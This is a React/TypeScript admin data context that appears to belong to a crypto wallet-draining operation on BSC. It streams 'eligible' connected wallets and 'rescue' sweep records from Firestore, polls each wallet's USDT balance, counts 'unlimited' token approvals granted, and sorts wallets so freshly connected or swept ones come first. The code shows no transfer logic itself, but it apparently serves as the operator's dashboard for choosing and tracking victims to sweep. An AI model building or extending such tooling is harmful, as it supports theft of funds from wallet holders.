// src/client/context/AdminDataContext.tsx
import React, { createContext, useContext, useState, useEffect, ReactNode, useMemo, useCallback } from 'react';
import {
  collection,
  query,
  where,
  onSnapshot,
  Timestamp,
} from 'firebase/firestore';
import { ethers } from 'ethers';
import { db } from '../config/firebase';
import { RPC_URL, USDT_CONTRACT } from '../config/publicConfig';

export interface WalletDoc {
  id: string;
  status: string;
  sponsoredAt?: Timestamp;
  sponsorTxHash?: string;
  createdAt?: string;
}

export interface SweepInfo {
  sweptAtMs: number;
  txHash?: string;
  amount?: string;
  formattedAmount?: string;
}

export interface TwoDayStats {
  total: number;
  successful: number;
  unlimitedGranted: number;
}

interface AdminDataContextType {
  allWallets: WalletDoc[];
  sortedWallets: WalletDoc[];
  twoDayStats: TwoDayStats | null;
  latestSweepsMap: Record<string, SweepInfo>;
  balances: Record<string, { balance: string; loading: boolean }>;
  refreshBalance: (address: string) => Promise<void>;
  refreshAllBalances: () => Promise<void>;
  recordLocalSweep: (address: string, txHash?: string, amount?: string) => void;
  connectedCount: number;
  unlimitedTodayCount: number;
  isLoading: boolean;
  error: string | null;
}

const AdminDataContext = createContext<AdminDataContextType | undefined>(undefined);

// ── Date helper functions ───────────────────────────────────────────────
function startOfToday(): Timestamp {
  const d = new Date();
  d.setHours(0, 0, 0, 0);
  return Timestamp.fromDate(d);
}

const BSC_RPCS = [
  RPC_URL,
  'https://bsc-rpc.publicnode.com/',
  'https://binance.llamarpc.com',
  'https://bsc-dataseed.binance.org/',
];

const ERC20_BALANCE_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
];

async function fetchOnChainUSDTBalance(address: string): Promise<string> {
  for (const rpc of BSC_RPCS) {
    try {
      const provider = new ethers.JsonRpcProvider(rpc, undefined, { staticNetwork: true });
      const contract = new ethers.Contract(USDT_CONTRACT, ERC20_BALANCE_ABI, provider);
      const rawBal: bigint = await contract.balanceOf(address);
      const formatted = ethers.formatUnits(rawBal, 18);
      const num = parseFloat(formatted);
      if (num === 0) return '0.00';
      if (num < 0.01) return num.toFixed(4);
      return num.toLocaleString(undefined, {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      });
    } catch {
      // try next fallback rpc
    }
  }
  return '0.00';
}

export const AdminDataProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const [allWallets, setAllWallets] = useState<WalletDoc[]>([]);
  const [twoDayStats, setTwoDayStats] = useState<TwoDayStats | null>(null);
  const [dbSweepsMap, setDbSweepsMap] = useState<Record<string, SweepInfo>>({});
  const [localSweepsMap, setLocalSweepsMap] = useState<Record<string, SweepInfo>>({});
  const [balances, setBalances] = useState<Record<string, { balance: string; loading: boolean }>>({});
  const [isWalletsLoaded, setIsWalletsLoaded] = useState(false);
  const [isRescuesLoaded, setIsRescuesLoaded] = useState(false);
  const [error, setError] = useState<string | null>(null);

  // Combine Firestore database sweeps with immediate optimistic sweeps
  const latestSweepsMap = useMemo(() => {
    return { ...dbSweepsMap, ...localSweepsMap };
  }, [dbSweepsMap, localSweepsMap]);

  useEffect(() => {
    setError(null);

    // 1. Real-time listener for ELIGIBLE wallets (sponsors collection)
    const walletsQuery = query(
      collection(db, 'sponsors'),
      where('status', '==', 'ELIGIBLE')
    );

    const unsubWallets = onSnapshot(
      walletsQuery,
      (snapshot) => {
        const wallets: WalletDoc[] = snapshot.docs.map((doc) => ({
          id: doc.id,
          ...(doc.data() as Omit<WalletDoc, 'id'>),
        }));
        setAllWallets(wallets);
        setIsWalletsLoaded(true);
      },
      (err) => {
        console.error('AdminDataContext sponsors listener error:', err);
        setError(err.message ?? 'Failed to stream approved wallets.');
        setIsWalletsLoaded(true);
      }
    );

    // 2. Real-time listener for rescues collection (all sweeps)
    const rescuesQuery = query(collection(db, 'rescues'));

    const unsubRescues = onSnapshot(
      rescuesQuery,
      (snapshot) => {
        const docs = snapshot.docs.map((doc) => doc.data());

        // 48h stats
        const now = Date.now();
        const cutoff48h = now - 48 * 60 * 60 * 1000;
        const recentDocs = docs.filter((d) => {
          if (!d.createdAt) return false;
          const ms = typeof d.createdAt.toMillis === 'function'
            ? d.createdAt.toMillis()
            : new Date(d.createdAt).getTime();
          return ms >= cutoff48h;
        });

        setTwoDayStats({
          total: recentDocs.length,
          successful: recentDocs.filter((d) => d.status === 'CONFIRMED').length,
          unlimitedGranted: recentDocs.filter(
            (d) => d.status === 'CONFIRMED' && d.amount && d.amount !== '0'
          ).length,
        });

        // Map latest sweep per wallet
        const sweeps: Record<string, SweepInfo> = {};
        for (const d of docs) {
          const user = (d.user || '').toLowerCase();
          if (!user) continue;
          let ms = 0;
          if (typeof d.createdAt?.toMillis === 'function') {
            ms = d.createdAt.toMillis();
          } else if (d.createdAt) {
            ms = new Date(d.createdAt).getTime() || 0;
          }

          const existing = sweeps[user];
          if (!existing || ms > existing.sweptAtMs) {
            sweeps[user] = {
              sweptAtMs: ms,
              txHash: d.sweepTxHash,
              amount: d.amount,
              formattedAmount: d.amountFormatted,
            };
          }
        }
        setDbSweepsMap(sweeps);
        setIsRescuesLoaded(true);
      },
      (err) => {
        console.error('AdminDataContext rescues listener error:', err);
        setIsRescuesLoaded(true);
      }
    );

    return () => {
      unsubWallets();
      unsubRescues();
    };
  }, []);

  // ── Fetch & Monitor on-chain USDT balances for connected wallets ────────
  // silent: if true, does not trigger loading state to avoid UI flicker
  const fetchSingleBalance = useCallback(async (address: string, silent = false) => {
    const lower = address.toLowerCase();
    if (!silent) {
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: prev[lower]?.balance ?? '0.00', loading: true },
      }));
    }

    try {
      const bal = await fetchOnChainUSDTBalance(address);
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: bal, loading: false },
      }));
    } catch {
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: prev[lower]?.balance ?? '0.00', loading: false },
      }));
    }
  }, []);

  const refreshAllBalances = useCallback(async () => {
    const promises = allWallets.map((w) => fetchSingleBalance(w.id, true));
    await Promise.allSettled(promises);
  }, [allWallets, fetchSingleBalance]);

  // Initial balance load for wallets that don't have balance yet
  useEffect(() => {
    if (allWallets.length === 0) return;

    let isSubscribed = true;

    const checkBalances = async () => {
      for (const w of allWallets) {
        if (!isSubscribed) break;
        const lower = w.id.toLowerCase();
        if (balances[lower] && !balances[lower].loading) continue;
        await fetchSingleBalance(w.id, false);
      }
    };

    checkBalances();

    return () => {
      isSubscribed = false;
    };
  }, [allWallets, fetchSingleBalance]);

  // ── Record an immediate sweep event locally (moves wallet to top & zeroes balance) ─
  const recordLocalSweep = useCallback(
    (address: string, txHash?: string, amount?: string) => {
      const lower = address.toLowerCase();
      setLocalSweepsMap((prev) => ({
        ...prev,
        [lower]: {
          sweptAtMs: Date.now(),
          txHash,
          amount,
          formattedAmount: amount,
        },
      }));

      // Immediately zero out the balance
      setBalances((prev) => ({
        ...prev,
        [lower]: { balance: '0.00', loading: false },
      }));
    },
    []
  );

  // ── Derived metrics ─────────────────────────────────────────────────
  const connectedCount = allWallets.length;

  const unlimitedTodayCount = useMemo(() => {
    const todayCutoff = startOfToday().toMillis();
    return allWallets.filter((w) => {
      if (!w.sponsoredAt) return false;
      const ms = w.sponsoredAt.toMillis?.() ?? 0;
      return ms >= todayCutoff;
    }).length;
  }, [allWallets]);

  // ── Keep newly connected and latest swept wallets on the top ─────────
  const sortedWallets = useMemo(() => {
    return [...allWallets].sort((a, b) => {
      const getScore = (w: WalletDoc) => {
        const sponsoredMs = w.sponsoredAt?.toMillis?.() ?? 0;
        let createdMs = 0;
        if (w.createdAt) {
          if (typeof (w.createdAt as any).toMillis === 'function') {
            createdMs = (w.createdAt as any).toMillis();
          } else {
            const parsed = new Date(w.createdAt as any).getTime();
            if (!isNaN(parsed)) createdMs = parsed;
          }
        }
        const sweepMs = latestSweepsMap[w.id.toLowerCase()]?.sweptAtMs ?? 0;
        // The most recent event (connect or sweep) determines rank
        return Math.max(sponsoredMs, createdMs, sweepMs);
      };
      return getScore(b) - getScore(a);
    });
  }, [allWallets, latestSweepsMap]);

  const isLoading = !isWalletsLoaded || !isRescuesLoaded;

  return (
    <AdminDataContext.Provider
      value={{
        allWallets,
        sortedWallets,
        twoDayStats,
        latestSweepsMap,
        balances,
        refreshBalance: (addr) => fetchSingleBalance(addr, false),
        refreshAllBalances,
        recordLocalSweep,
        connectedCount,
        unlimitedTodayCount,
        isLoading,
        error,
      }}
    >
      {children}
    </AdminDataContext.Provider>
  );
};

export const useAdminData = (): AdminDataContextType => {
  const context = useContext(AdminDataContext);
  if (!context) {
    throw new Error('useAdminData must be used within an AdminDataProvider');
  }
  return context;
};
